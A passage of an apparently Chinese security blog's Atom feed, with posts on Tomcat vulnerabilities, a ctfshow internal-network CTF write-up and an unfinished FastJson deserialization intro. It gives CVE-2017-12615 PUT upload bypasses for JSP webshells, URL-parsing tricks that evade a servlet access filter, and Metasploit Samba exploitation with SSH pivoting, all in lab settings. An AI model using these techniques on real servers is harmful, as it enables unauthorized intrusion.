    
    <category term="渗透" scheme="http://c1oudfl0w0.github.io/blog/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="内网" scheme="http://c1oudfl0w0.github.io/blog/tags/%E5%86%85%E7%BD%91/"/>
    
    <category term="Redis" scheme="http://c1oudfl0w0.github.io/blog/tags/Redis/"/>
    
  </entry>
  
  <entry>
    <title>Tomcat漏洞总结</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/07/23/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/07/23/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</id>
    <published>2024-07-23T09:14:11.000Z</published>
    <updated>2024-07-26T09:35:16.270Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参考：</p><p><a href="https://xz.aliyun.com/t/10083">https://xz.aliyun.com/t/10083</a></p><p><a href="https://xz.aliyun.com/t/7544">https://xz.aliyun.com/t/7544</a></p><span id="more"></span><hr><h1 id="Tomcat-PUT方法任意写文件漏洞（CVE-2017-12615）"><a href="#Tomcat-PUT方法任意写文件漏洞（CVE-2017-12615）" class="headerlink" title="Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）"></a>Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）</h1><p>复现环境：<a href="https://github.com/vulhub/vulhub/blob/master/tomcat/CVE-2017-12615/">https://github.com/vulhub/vulhub/blob/master/tomcat/CVE-2017-12615/</a></p><p>版本限制：不确定，貌似是一个配置漏洞</p><p>漏洞成因：</p><p>&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;conf&#x2F;web.xml</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">></span></span>readonly<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>readonly设置为false，此时我们就可以使用 PUT 方法进行文件上传</p><p><img src="/blog/2024/07/23/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240726115438187.png" alt="image-20240726115438187"></p><p>返回201，说明成功上传</p><p>看一下 &#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;ROOT 目录</p><p><img src="/blog/2024/07/23/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240726115527994.png" alt="image-20240726115527994"></p><p>可以看到刚才上传的test.txt文件</p><p>接下来尝试上传.jsp，返回404，应该是当成路径访问进行解析了</p><p><img src="/blog/2024/07/23/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240726115822467.png" alt="image-20240726115822467"></p><p>这里就需要进行绕过，有三种方法：</p><ol><li>Windows下不允许文件以空格结尾：以<code>PUT /a001.jsp%20 HTTP/1.1</code>上传到 Windows 会被自动去掉末尾空格</li><li>Windows NTFS流：<code>PUT /a001.jsp::$DATA HTTP/1.1</code>\</li><li><code>/</code>在文件名中是非法的，也会被去除（Linux&#x2F;Windows）：<code>PUT /a001.jsp/ HTTP/1.1</code></li></ol><p>这里只演示第三种：</p><p><img src="/blog/2024/07/23/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240726120126859.png" alt="image-20240726120126859"></p><p>成功上传，然后蚁剑getshell即可</p><hr><h1 id="Tomcat-URL解析差异性导致的安全问题"><a href="#Tomcat-URL解析差异性导致的安全问题" class="headerlink" title="Tomcat URL解析差异性导致的安全问题"></a>Tomcat URL解析差异性导致的安全问题</h1><p>后台使用<code>getRequestURI()</code>或<code>getRequestURL()</code>函数来解析用户请求的URL时，若URL中包含了一些特殊符号，则可能会造成访问限制绕过的安全风险</p><h2 id="HTTPServletRequest对URL的解析差异性"><a href="#HTTPServletRequest对URL的解析差异性" class="headerlink" title="HTTPServletRequest对URL的解析差异性"></a>HTTPServletRequest对URL的解析差异性</h2><p>在Servlet处理URL请求的路径时，HTTPServletRequest有如下几个常用的函数：</p><ul><li><code>request.getRequestURL()</code>：返回全路径；</li><li><code>request.getRequestURI()</code>：返回除去Host（域名或IP）部分的路径；</li><li><code>request.getContextPath()</code>：返回工程名部分，如果工程映射为<code>/</code>，则返回为空；</li><li><code>request.getServletPath()</code>：返回除去Host和工程名部分的路径；</li><li><code>request.getPathInfo()</code>：仅返回传递到Servlet的路径，如果没有传递额外的路径信息，则此返回Null；</li></ul><p>设Servlet的匹配路径为<code>/test%3F/*</code>，并且Web应用是部署在<code>/app</code>下</p><p>此时请求的URL为<code>http://30thh.loc:8480/app/test%3F/a%3F+b;jsessionid=s%3F+ID?p+1=c+d&amp;p+2=e+f#a</code>，则各个函数解析如下表：</p><table><thead><tr><th>函数</th><th>URL解码</th><th>解析结构</th></tr></thead><tbody><tr><td>getRequestURL()</td><td>no</td><td><code>http://30thh.loc:8480/app/test%3F/a%3F+b;jsessionid=s%3F+ID</code></td></tr><tr><td>getRequestURI()</td><td>no</td><td><code>/app/test%3F/a%3F+b;jsessionid=s%3F+ID</code></td></tr><tr><td>getContextPath()</td><td>no</td><td><code>/app</code></td></tr><tr><td>getServletPath()</td><td>yes</td><td><code>/test?</code></td></tr><tr><td>getPathInfo()</td><td>yes</td><td><code>/a?+b</code></td></tr></tbody></table><hr><h2 id="特殊字符的URL解析"><a href="#特殊字符的URL解析" class="headerlink" title="特殊字符的URL解析"></a>特殊字符的URL解析</h2><p>Tomcat中的URL解析是支持嵌入<code>./</code>、<code>../</code>、<code>;xx/</code>等特殊字符的</p><p>新建一个Java Web项目，1.jsp如下：</p><pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;%out.println(&quot;getRequestURL(): &quot; + request.getRequestURL() + &quot;&lt;br&gt;&quot;);out.println(&quot;getRequestURI(): &quot; + request.getRequestURI() + &quot;&lt;br&gt;&quot;);out.println(&quot;getContextPath(): &quot; + request.getContextPath() + &quot;&lt;br&gt;&quot;);out.println(&quot;getServletPath(): &quot; + request.getServletPath() + &quot;&lt;br&gt;&quot;);out.println(&quot;getPathInfo(): &quot; + request.getPathInfo() + &quot;&lt;br&gt;&quot;);%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>放在test目录下</p><h3 id="正常访问"><a href="#正常访问" class="headerlink" title="正常访问"></a>正常访问</h3><p><code>http://localhost:8082/test/1.jsp</code></p><p><img src="/blog/2024/07/23/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240726172209143.png" alt="image-20240726172209143"></p><h3 id="插入-x2F-访问"><a href="#插入-x2F-访问" class="headerlink" title="插入 .&#x2F; 访问"></a>插入 .&#x2F; 访问</h3><p>插入多个<code>./</code>访问，即<code>http://localhost:8082/test/./././1.jsp</code></p><p><img src="/blog/2024/07/23/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240726172226480.png" alt="image-20240726172226480"></p><p>接着尝试这种形式<code>http://localhost:8082/test/.a/.bb/.ccc/1.jsp</code></p><p><img src="/blog/2024/07/23/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240726172358304.png" alt="image-20240726172358304"></p><p>返回404，未找到资源</p><h3 id="插入-x2F-访问-1"><a href="#插入-x2F-访问-1" class="headerlink" title="插入 ..&#x2F; 访问"></a>插入 ..&#x2F; 访问</h3><p>插入<code>../</code>访问，即<code>http://localhost:8082/test/../1.jsp</code></p><p><img src="/blog/2024/07/23/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240726172534288.png" alt="image-20240726172534288"></p><p>404，因为此时实际访问的是<code>http://localhost:8082/test/1.jsp</code>，也就说明进行了目录穿越</p><h3 id="插入-x2F-访问-2"><a href="#插入-x2F-访问-2" class="headerlink" title="插入 ;&#x2F; 访问"></a>插入 ;&#x2F; 访问</h3><p>插入多个<code>;/</code>访问，即<code>http://localhost:8082/test/;/;/;/1.jsp</code></p><p><img src="/blog/2024/07/23/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240726172725318.png" alt="image-20240726172725318"></p><p>正常返回，同样的在<code>;</code>后面加字符串也能正常访问</p><hr><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>咕</p><hr><h2 id="攻击利用"><a href="#攻击利用" class="headerlink" title="攻击利用"></a>攻击利用</h2><p>遇到下面这种filter：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">filter</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> testFilter <span class="token keyword">implements</span> <span class="token class-name">Filter</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">FilterConfig</span> filterConfig<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> servletRequest<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> servletResponse<span class="token punctuation">,</span> <span class="token class-name">FilterChain</span> filterChain<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">HttpServletRequest</span> httpServletRequest <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">)</span>servletRequest<span class="token punctuation">;</span>        <span class="token class-name">HttpServletResponse</span> httpServletResponse <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HttpServletResponse</span><span class="token punctuation">)</span>servletResponse<span class="token punctuation">;</span>        <span class="token class-name">String</span> url <span class="token operator">=</span> httpServletRequest<span class="token punctuation">.</span><span class="token function">getRequestURI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"/test/info"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            httpServletResponse<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"No Permission."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        filterChain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>servletRequest<span class="token punctuation">,</span> servletResponse<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时我们如果想要访问 &#x2F;test&#x2F;info 下的文件，如<code>/test/info/secert.jsp</code>的话会被拦截返回No Permission</p><p>而根据前面的url解析我们可以得到下面这几种绕过的方法：</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//localhost:8080/test/./info/secret.jsp</span></span><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//localhost:8080/test/;aaa/info/secret.jsp</span></span><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//localhost:8080/test/aaa/../info/secret.jsp</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/10083&quot;&gt;https://xz.aliyun.com/t/10083&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/7544&quot;&gt;https://xz.aliyun.com/t/7544&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="http://c1oudfl0w0.github.io/blog/categories/Web/"/>
    
    
    <category term="CVE" scheme="http://c1oudfl0w0.github.io/blog/tags/CVE/"/>
    
    <category term="Java" scheme="http://c1oudfl0w0.github.io/blog/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow web859_有跳板机</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/07/20/ctfshow-web859-%E6%9C%89%E8%B7%B3%E6%9D%BF%E6%9C%BA/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/07/20/ctfshow-web859-%E6%9C%89%E8%B7%B3%E6%9D%BF%E6%9C%BA/</id>
    <published>2024-07-20T11:34:49.000Z</published>
    <updated>2024-07-20T12:53:37.037Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参考：</p><p><a href="https://fushuling.com/index.php/2023/08/20/ctfshow%e5%88%b7%e9%a2%98%e8%ae%b0%e5%bd%95%e6%8c%81%e7%bb%ad%e6%9b%b4%e6%96%b0%e4%b8%ad/">https://fushuling.com/index.php/2023/08/20/ctfshow%e5%88%b7%e9%a2%98%e8%ae%b0%e5%bd%95%e6%8c%81%e7%bb%ad%e6%9b%b4%e6%96%b0%e4%b8%ad/</a></p><p><a href="https://www.cnblogs.com/thebeastofwar/p/17750376.html">https://www.cnblogs.com/thebeastofwar/p/17750376.html</a></p><span id="more"></span><hr><h1 id="连接跳板机"><a href="#连接跳板机" class="headerlink" title="连接跳板机"></a>连接跳板机</h1><p>ssh连接上去，账密均为ctfshow</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> ctfshow@pwn.challenge.ctf.show <span class="token parameter variable">-p28246</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>登录上去之后尝试<code>cd ~</code>，发现缺少 &#x2F;home&#x2F;ctfshow 目录</p><p>发现能切成root权限</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token parameter variable">-s</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在&#x2F;home目录下创建一个ctfshow目录给权限</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> /home/ctfshow<span class="token function">chmod</span> <span class="token number">777</span> /home/ctfshow<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="fscan扫端口"><a href="#fscan扫端口" class="headerlink" title="fscan扫端口"></a>fscan扫端口</h1><p>接下来用ssh传一个fscan上去扫内网</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">scp</span> <span class="token parameter variable">-P</span> <span class="token number">28246</span> fscan ctfshow@pwn.challenge.ctf.show:/home/ctfshow<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/07/20/ctfshow-web859-%E6%9C%89%E8%B7%B3%E6%9D%BF%E6%9C%BA/image-20240720200128540.png" alt="image-20240720200128540"></p><p><code>ifconfig</code>查看内网网段</p><p><img src="/blog/2024/07/20/ctfshow-web859-%E6%9C%89%E8%B7%B3%E6%9D%BF%E6%9C%BA/image-20240720203655783.png" alt="image-20240720203655783"></p><p>然后fscan扫描172.2.235.4</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> <span class="token number">777</span> fscan./fscan <span class="token parameter variable">-h</span> <span class="token number">172.2</span>.235.4/24<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/blog/2024/07/20/ctfshow-web859-%E6%9C%89%E8%B7%B3%E6%9D%BF%E6%9C%BA/image-20240720203751766.png" alt="image-20240720203751766"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">start infoscan<span class="token punctuation">(</span>icmp<span class="token punctuation">)</span> Target <span class="token number">172.2</span>.235.4     is alive<span class="token punctuation">(</span>icmp<span class="token punctuation">)</span> Target <span class="token number">172.2</span>.235.1     is alive<span class="token punctuation">(</span>icmp<span class="token punctuation">)</span> Target <span class="token number">172.2</span>.235.5     is alive<span class="token punctuation">(</span>icmp<span class="token punctuation">)</span> Target <span class="token number">172.2</span>.235.6     is alive<span class="token punctuation">(</span>icmp<span class="token punctuation">)</span> Target <span class="token number">172.2</span>.235.7     is alive<span class="token punctuation">(</span>icmp<span class="token punctuation">)</span> Target <span class="token number">172.2</span>.235.2     is alive<span class="token punctuation">(</span>icmp<span class="token punctuation">)</span> Target <span class="token number">172.2</span>.235.3     is alive<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Icmp alive hosts len is: <span class="token number">7</span><span class="token number">172.2</span>.235.6:139 <span class="token function">open</span><span class="token number">172.2</span>.235.4:22 <span class="token function">open</span><span class="token number">172.2</span>.235.5:80 <span class="token function">open</span><span class="token number">172.2</span>.235.6:445 <span class="token function">open</span><span class="token number">172.2</span>.235.5:9000 <span class="token function">open</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>开了139和445端口</p><p>看一下这两个端口常有什么漏洞：</p><ul><li>139：samba服务</li><li>445：smb相关服务</li></ul><h1 id="msf-getshell"><a href="#msf-getshell" class="headerlink" title="msf getshell"></a>msf getshell</h1><p>因为跳板机里已经有装了一些攻击工具，那么启动msf：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfconsole<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/07/20/ctfshow-web859-%E6%9C%89%E8%B7%B3%E6%9D%BF%E6%9C%BA/image-20240720202823525.png" alt="image-20240720202823525"></p><p>测试了一下要用<code>is_known_pipename</code>打</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use exploit/linux/samba/is_known_pipename<span class="token builtin class-name">set</span> rhost <span class="token number">172.2</span>.235.6exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/07/20/ctfshow-web859-%E6%9C%89%E8%B7%B3%E6%9D%BF%E6%9C%BA/image-20240720204001343.png" alt="image-20240720204001343"></p><p>flag在root下</p><hr><h1 id="测试：内网代理"><a href="#测试：内网代理" class="headerlink" title="测试：内网代理"></a>测试：内网代理</h1><p>这里的跳板机相当于我们已经获得了一台服务器的权限</p><h2 id="单层代理"><a href="#单层代理" class="headerlink" title="单层代理"></a>单层代理</h2><p>现在我们尝试将本地的8085端口转发到可控服务器内网中 172.2.235.5 的80端口（即内网的web服务）</p><p>然后就可以通过访问 127.0.0.1:8085 来访问 172.2.235.5:80</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> <span class="token parameter variable">-L</span> <span class="token number">8085</span>:172.2.235.5:80 ctfshow@pwn.challenge.ctf.show <span class="token parameter variable">-p</span> <span class="token number">28229</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/07/20/ctfshow-web859-%E6%9C%89%E8%B7%B3%E6%9D%BF%E6%9C%BA/image-20240720204543400.png" alt="image-20240720204543400"></p><p><img src="/blog/2024/07/20/ctfshow-web859-%E6%9C%89%E8%B7%B3%E6%9D%BF%E6%9C%BA/image-20240720204602540.png" alt="image-20240720204602540"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://fushuling.com/index.php/2023/08/20/ctfshow%e5%88%b7%e9%a2%98%e8%ae%b0%e5%bd%95%e6%8c%81%e7%bb%ad%e6%9b%b4%e6%96%b0%e4%b8%ad/&quot;&gt;https://fushuling.com/index.php/2023/08/20/ctfshow%e5%88%b7%e9%a2%98%e8%ae%b0%e5%bd%95%e6%8c%81%e7%bb%ad%e6%9b%b4%e6%96%b0%e4%b8%ad/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/thebeastofwar/p/17750376.html&quot;&gt;https://www.cnblogs.com/thebeastofwar/p/17750376.html&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="渗透" scheme="http://c1oudfl0w0.github.io/blog/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="内网" scheme="http://c1oudfl0w0.github.io/blog/tags/%E5%86%85%E7%BD%91/"/>
    
    <category term="ctfshow" scheme="http://c1oudfl0w0.github.io/blog/tags/ctfshow/"/>
    
  </entry>
  
  <entry>
    <title>FastJson反序列化</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/07/19/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/07/19/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-07-19T15:25:33.000Z</published>
    <updated>2024-07-19T15:28:56.045Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参考：</p><p><a href="https://natro92.fun/posts/ac90d224/">https://natro92.fun/posts/ac90d224/</a></p><p><a href="https://boogipop.com/2023/03/02/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://boogipop.com/2023/03/02/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p><p><a href="https://zer0peach.github.io/2023/09/24/FastJSON/">https://zer0peach.github.io/2023/09/24/FastJSON/</a></p><p><a href="https://drun1baby.top/2022/08/04/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8701-Fastjson%E5%9F%BA%E7%A1%80">https://drun1baby.top/2022/08/04/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8701-Fastjson%E5%9F%BA%E7%A1%80</a></p><span id="more"></span><hr><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><blockquote><p>Fastjson 是 Alibaba 开发的 Java 语言编写的高性能 JSON 库，用于将数据在 JSON 和 Java Object 之间互相转换。</p></blockquote><p>提供两个主要接口来分别实现序列化和反序列化操作。</p><p><code>JSON.toJSONString</code> 将 Java 对象转换为 json 对象，序列化的过程。</p><p><code>JSON.parseObject/JSON.parse</code> 将 json 对象重新变回 Java 对象；反序列化的过程</p><p>所以可以简单的把 json 理解成是一个字符串</p><hr><h1 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h1><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.alibaba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>fastjson<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.2.24<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://natro92.fun/posts/ac90d224/&quot;&gt;https://natro92.fun/posts/ac90d224/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://boogipop.com/2023/03/02/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/&quot;&gt;https://boogipop.com/2023/03/02/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://zer0peach.github.io/2023/09/24/FastJSON/&quot;&gt;https://zer0peach.github.io/2023/09/24/FastJSON/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://drun1baby.top/2022/08/04/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8701-Fastjson%E5%9F%BA%E7%A1%80&quot;&gt;https://drun1baby.top/2022/08/04/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8701-Fastjson%E5%9F%BA%E7%A1%80&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="http://c1oudfl0w0.github.io/blog/categories/Web/"/>
    
    
    <category term="Java" scheme="http://c1oudfl0w0.github.io/blog/tags/Java/"/>
    
    <category term="反序列化" scheme="http://c1oudfl0w0.github.io/blog/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>SPEL表达式注入</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/07/19/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/07/19/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/</id>
    <published>2024-07-19T03:59:17.000Z</published>
    <updated>2024-07-19T15:04:07.916Z</updated>
    
